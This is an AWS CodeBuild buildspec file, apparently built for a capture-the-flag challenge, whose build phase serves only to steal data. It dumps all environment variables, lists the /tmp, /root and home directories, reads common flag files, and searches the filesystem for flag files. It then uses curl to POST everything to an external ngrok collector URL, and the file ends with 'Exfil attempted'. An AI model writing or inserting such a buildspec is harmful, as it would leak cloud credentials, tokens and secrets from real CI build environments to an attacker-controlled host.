version: 0.2

phases:
  build:
    commands:
      - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"
      - echo "Starting flag dump..." > /tmp/output.txt
      - env >> /tmp/output.txt 2>&1 || true
      - echo "" >> /tmp/output.txt
      - echo "=== Checking /tmp ===" >> /tmp/output.txt
      - ls -la /tmp/ >> /tmp/output.txt 2>&1 || true
      - echo "" >> /tmp/output.txt
      - echo "=== Checking /root ===" >> /tmp/output.txt
      - ls -la /root/ >> /tmp/output.txt 2>&1 || true
      - echo "" >> /tmp/output.txt
      - echo "=== Checking HOME ===" >> /tmp/output.txt
      - ls -la $HOME/ >> /tmp/output.txt 2>&1 || true
      - echo "" >> /tmp/output.txt
      - echo "=== PWD ===" >> /tmp/output.txt
      - pwd >> /tmp/output.txt 2>&1 || true
      - ls -la >> /tmp/output.txt 2>&1 || true
      - echo "" >> /tmp/output.txt
      - echo "=== Common flag locations ===" >> /tmp/output.txt
      - cat /tmp/flag 2>/dev/null >> /tmp/output.txt || true
      - cat /root/flag 2>/dev/null >> /tmp/output.txt || true
      - cat /flag 2>/dev/null >> /tmp/output.txt || true
      - echo "" >> /tmp/output.txt
      - echo "=== Find flag files ===" >> /tmp/output.txt
      - find / -maxdepth 3 -name '*flag*' 2>/dev/null >> /tmp/output.txt || true
      - echo "" >> /tmp/output.txt
      - echo "=== Codebuild env vars ===" >> /tmp/output.txt
      - env | grep -i codebuild >> /tmp/output.txt || true
      - echo "Done collecting" >> /tmp/output.txt
      - curl -s -X POST "$COLLECTOR/dump" -H 'Content-Type: text/plain' --data-binary @/tmp/output.txt || echo "curl failed"
      - echo "Exfil attempted"
